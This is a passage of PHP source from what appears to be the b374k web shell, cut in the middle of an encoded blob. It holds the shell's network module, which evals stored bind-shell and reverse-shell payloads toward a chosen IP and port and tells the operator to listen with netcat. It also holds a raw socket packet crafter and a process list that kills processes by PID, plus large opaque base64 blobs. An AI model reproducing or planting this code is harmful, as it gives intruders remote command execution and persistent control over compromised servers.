ioKdSsvNt180JeNugNPp/G9dHiw7Mp6FuEdP1wYWuhUTFJ6libBKCsrMZbB142LSypxWdAyEdoHZLmsqrQC3GieGkZHQBZOFhLxmeacNRRfn8UEEw6BSDv3/svZRg7AwtklaCK5QBKOUrB3DzG/k8Ut9RRigqUKlRh83jsdIZSLpGKlWAiLY5SKNOT6cPV+Li1EbA+LJbAkTSiNE6dV9/A4cQ6hcjulfbVVZmIu3Z8SvqJHrqhZmC2hymXipRuE7sLUjurA6kgukydUsZRzlDbPb3z4MkohUksLnEO4yPiQlX1EHLwaVmetlacrDvUkqyB8Trbk/U/GZeIu3qVseyKcIN/K//lV9XLR58ezHMIkUjMLq1wxES9VCU9I1a9ivB/eOJMPB9CqZDWODTaJwqSwqjjyyDdWw2ujU7fND/+iq/qlby6fnxEumy//OkMb1dGgomZhxRib9B07XlTLBsVuKr4wiwHnZdFqb8z+Yb8f4VCq1ZK2R6c9qAs9/eAfRmYn00uZBIXESp6YMtAnXQhg0uen5zzvTe7PIcjEsrSsvNUElSRD3unww3WhNDs9CypOP1sp7Rr/W1NiHDeOk7mQa1cfVG5zpy246x2pU531eShXlba8dkLYsCNVIhd5qwJmJTukgw4dGVsV2Z2b6lPztu86tVUuxePD25Uq6SZi/srizBWcgzGhPAwR7Z/5GkFLc2z7TOdM9if/6ADM0mFNQ9IQPpl+2JO8ec78bsd7GDAgT36LepLCyVqCAyCC8s4KkM6lZ3Xi13kctDIuZ+JalYDn9jaPD2UllObdJQzj4yLyVC+4QOAk8BANRN5eIRWen8JWOAwNyVyYJg+l2yTdEN3a6crkeIi3FnRAPUXKspM4Vcwc15YJHi5VrTULwkp3OmpyJMFZo5iKwRP4ecGx8X40QcYB5gm2KyxVHaI8DYCMi7Yyxi7NBQoYbzpVNoC87VkFDfaVHMDQYOEjSKL2BmKhG1/LHnxYCSEc06Um6OdpR6YZXcrhCzNt/O8QhgnTpRpVW78NVf1erdoBnNLmSh8RzdaOITCsu/p7fusfAjXE/dPkH4ppr2ALXgLPEER7G2OwW6Z9OZ1N24MNQhe1Vj0xmIY+MYx6rLYR1BG010DtIJjzC+bWIA+FU3QTtTvRle4hhLsPBGByJjRrAPVTPWEPH0y/MkC8YqIXNy2e1FgGMGMzuVYlHT92GhoAIwDoCdYmOEDPBw2FnoAJ3euzGO01InJYhPqH0HJEE9yte5EY8fRMAnJ45sUESifocFozaHmMHM5FAf0ZKTqi1cYQpH7mVUFM/DYwLhG5b9h9Ar16GihfI3DLT4qJj5kBkwzHZ4iG+rVoUqKX6auNa2O2YeKQ20JDCFuzDVjZpP5VO6QZ9ItFEMucDQ2ghgNMf1Nkgm224TYiMJv+469Iu2UkpZGCljZxAC2qdoI39ncSYeIA/y//C6S0HQBE7X/EvkBjzZ+wSjQu+RNWj8bG9v++bjOK30O1H9XnqGJvAwD99pu5eW8t+631fGsjQ2PXh/J8vD1CeDxApspOU8LoMU4KJMZ581H0jRsdHPmWAfAUQhFPkqoUKvO4ABAuhmeeT1yRSClWqQBgg+T10QzFYPRo91vMlUoVab9FYUqxGP3m0FzJ6+TXiQBfokhF//zoHVuRlimG0dozN+f/O7/5vwA="; $GLOBALS['module']['network']['id'] = "network";
$GLOBALS['module']['network']['title'] = "Network";
$GLOBALS['module']['network']['js_ontabselected'] = "";
$GLOBALS['module']['network']['content'] = "
<table class='boxtbl'>
<thead> <tr><th colspan='2'><p class='boxtitle'>Bind Shell</p></th></tr>
</thead>
<tbody> <tr><td style='width:144px'>Server IP</td><td><input type='text' id='bindAddr' value='".$server_addr."' disabled></td></tr> <tr><td>Port</td><td><input type='text' id='bindPort' value='".$default_port."' onkeydown=\"trap_enter(event, 'rs_go_bind');\"></td></tr>
</tbody>
<tfoot> <tr> <td style='width:144px;'> <select id='bindLang' class='rsType'> ".$winbinary." </select> </td> <td><span class='button' onclick=\"rs_go_bind();\" style='width:120px;'>run</span></td> </tr> <tr><td colspan='2'><pre id='bindResult'>Press ' run ' button and run ' nc server_ip port ' on your computer</pre></td></tr>
</tfoot>
</table>
<br>
<table class='boxtbl'>
<thead> <tr><th colspan='2'><p class='boxtitle'>Reverse Shell</p></th></tr>
</thead>
<tbody> <tr><td style='width:144px'>Target IP</td><td><input type='text' id='backAddr' value='".$remote_addr."' onkeydown=\"trap_enter(event, 'rs_go_back');\"></td></tr> <tr><td>Port</td><td><input type='text' id='backPort' value='".$default_port."' onkeydown=\"trap_enter(event, 'rs_go_back');\"></td></tr>
</tbody>
<tfoot> <tr> <td style='width:144px;'> <select id='backLang' class='rsType'> ".$winbinary." </select> </td> <td><span class='button' onclick=\"rs_go('back');\" style='width:120px;'>run</span></td> </tr> <tr><td colspan='2'><pre id='backResult'>Run ' nc -l -v -p port ' on your computer and press ' run ' button</pre></td></tr>
</tfoot>
</table>
<br>
<table class='boxtbl'>
<thead> <tr><th colspan='2'><p class='boxtitle'>Simple Packet Crafter</p></th></tr>
</thead>
<tbody> <tr><td style='width:120px'>Host</td><td><input type='text' id='packetHost' value='tcp://".$server_addr."' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr> <tr><td>Start Port</td><td><input type='text' id='packetStartPort' value='80' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr> <tr><td>End Port</td><td><input type='text' id='packetEndPort' value='80' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr> <tr><td>Connection Timeout</td><td><input type='text' id='packetTimeout' value='5' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr> <tr><td>Stream Timeout</td><td><input type='text' id='packetSTimeout' value='5' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>
</tbody>
<tfoot> <tr><td colspan='2'><textarea id='packetContent' style='height:140px;min-height:140px;'>GET / HTTP/1.1\\r\\n\\r\\n</textarea></td></tr> <tr> <td> <span class='button' onclick=\"packet_go();\" style='width:120px;'>run</span> </td> <td>You can also press ctrl+enter to submit</td> </tr> <tr><td colspan='2'><div id='packetResult'></div></td></tr>
</tfoot>
</table>
"; if(isset($p['rsLang']) && isset($p['rsArgs'])){ $rsLang = $p['rsLang']; $rsArgs = $p['rsArgs']; $res = ""; if($rsLang=="php"){ $code = get_resource("rs_".$rsLang); if($code!==false){ $code = "\$target = \"".$rsArgs."\"; ?>".$code; $res = eval_go($rsLang, $code, "", ""); } } else{ $code = get_resource("rs_".$rsLang); if($code!==false){ $res = eval_go($rsLang, $code, "", $rsArgs); } } if($res===false) $res == "error"; output(html_safe($res));
}
elseif(isset($p['packetTimeout'])&&isset($p['packetSTimeout'])&&isset($p['packetPort'])&&isset($p['packetTimeout'])&&isset($p['packetContent'])){ $packetHost = trim($p['packetHost']); if(!preg_match("/[a-z0-9]+:\/\/.*/", $packetHost)) $packetHost = "tcp://".$packetHost; $packetPort = (int) $p['packetPort']; $packetTimeout = (int) $p['packetTimeout']; $packetSTimeout = (int) $p['packetSTimeout']; $packetContent = $p['packetContent']; if(ctype_xdigit($packetContent)) $packetContent = @pack("H*" , $packetContent); else{ $packetContent = str_replace(array("\r","\n"), "", $packetContent); $packetContent = str_replace(array("\\r","\\n"), array("\r", "\n"), $packetContent); } $res = ""; $sock = fsockopen($packetHost, $packetPort, $errNo, $errStr, $packetTimeout); if(!$sock){ $res .= "<div class='weak'>"; $res .= html_safe(trim($errStr))." (error ".html_safe(trim($errNo)).")</div>"; } else{ stream_set_timeout($sock, $packetSTimeout); fwrite($sock, $packetContent."\r\n\r\n\x00"); $counter = 0; $maxtry = 1; $bin = ""; do{ $line = fgets($sock, 1024); if(trim($line)=="") $counter++; $bin .= $line; }while($counter<$maxtry); fclose($sock); $res .= "<table class='boxtbl'><tr><td><textarea style='height:140px;min-height:140px;'>".html_safe($bin)."</textarea></td></tr>"; $res .= "<tr><td><textarea style='height:140px;min-height:140px;'>".bin2hex($bin)."</textarea></td></tr></table>"; } output($res);
} $GLOBALS['module']['processes']['id'] = "processes";
$GLOBALS['module']['processes']['title'] = "Processes";
$GLOBALS['module']['processes']['js_ontabselected'] = "show_processes();";
$GLOBALS['module']['processes']['content'] = ""; if(!function_exists('show_processes')){ function show_processes(){ $output = ''; $wcount = 11; if(is_win()){ $cmd = "tasklist /V /FO csv"; $wexplode = "\",\""; } else{ $cmd = "ps aux"; $wexplode = " "; } $res = execute($cmd); if(trim($res)=='') return false; else{ $output .= "<table id='psTable' class='dataView sortable'>"; if(!is_win()) $res = preg_replace('#\ +#',' ',$res); $psarr = explode("\n",$res); $fi = true; $tblcount = 0; $check = explode($wexplode,$psarr[0]); $wcount = count($check); foreach($psarr as $psa){ if(trim($psa)!=''){ if($fi){ $fi = false; $psln = explode($wexplode, $psa, $wcount); $output .= "<tr><th class='col-cbox sorttable_nosort'><div class='cBoxAll'></div></th><th class='sorttable_nosort'>action</th>"; foreach($psln as $p) $output .= "<th>".trim(trim(strtolower($p)) ,"\"")."</th>"; $output .= "</tr>"; } else{ $psln = explode($wexplode, $psa, $wcount); $pid = trim(trim($psln[1]),"\""); $tblcount = 0; $output .= "<tr data-pid='".$pid."'>"; foreach($psln as $p){ if(trim($p)=="") $p = " "; $p = trim(trim($p) ,"\""); $p = html_safe($p); if($tblcount == 0){ $output .= "<td><div class='cBox'></div></td><td><a class='kill'>kill</a></td><td>".$p."</td>"; $tblcount++; } else{ $tblcount++; if($tblcount == count($psln)) $output .= "<td style='text-align:left;'>".$p."</td>"; else $output .= "<td style='text-align:center;'>".$p."</td>"; } } $output .= "</tr>"; } } } $colspan = count($psln)+1; $colspanAll = $colspan+1; $output .= "<tfoot><tr><td><div class='cBoxAll'></div></td><td colspan=".$colspan." style='text-align:left;'><span class='button' onclick='kill_selected();' style='margin-right:8px;'>kill selected</span><span class='button' onclick='show_processes();'>refresh</span><span class='psSelected'></span></td></tr></tfoot></table>"; } return $output; }
} if(isset($p['showProcesses'])){ $processes = show_processes(); if($processes!==false) output($processes); output('error');
}
elseif(isset($p['allPid'])){ $allPid = explode(" ", $p['allPid']); $counter = 0; foreach($allPid as $pid){ $pid = trim($pid); if(!empty($pid)){ if(function_exists("posix_kill")){ if(posix_kill($pid,'9')) $counter++; } else{ if(is_win()){ $cmd = execute("taskkill /F /PID ".$pid); $cmd = execute("tasklist /FI \"PID eq ".$pid."\""); if(strpos($cmd,"No tasks are running")!==false) $counter++; } else{ $cmd = execute("kill -9 ".$pid); if((strpos($cmd, "such process")===false)&&(strpos($cmd, "not permitted")===false)){ $cmd = trim(execute("ps -p ".$pid)); $check = explode("\n", $cmd); if(count($check)==1) $counter++; } } } } } if($counter>0) output($counter); else output('error');
} $error = @ob_get_contents();
$error_html = (!empty($error))?"<pre class='phpError border'>".str_replace("\n\n", "\n", html_safe($error))."</pre>":"";
@ob_end_clean();
error_reporting(0);
@ini_set('display_errors','0');?><!doctype html>
<html>
<head>
<title><?php echo $GLOBALS['title']." ".$GLOBALS['ver'];?></title>
<meta charset='utf-8'>
<meta name='robots' content='noindex, nofollow, noarchive'>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0">
<link rel='SHORTCUT ICON' href='<?php echo get_resource('b374k');?>'>
<style type="text/css">
@font-face {
font-family:'ubuntumono';
src:url(data:application/x-font-woff;charset=utf-8;base64,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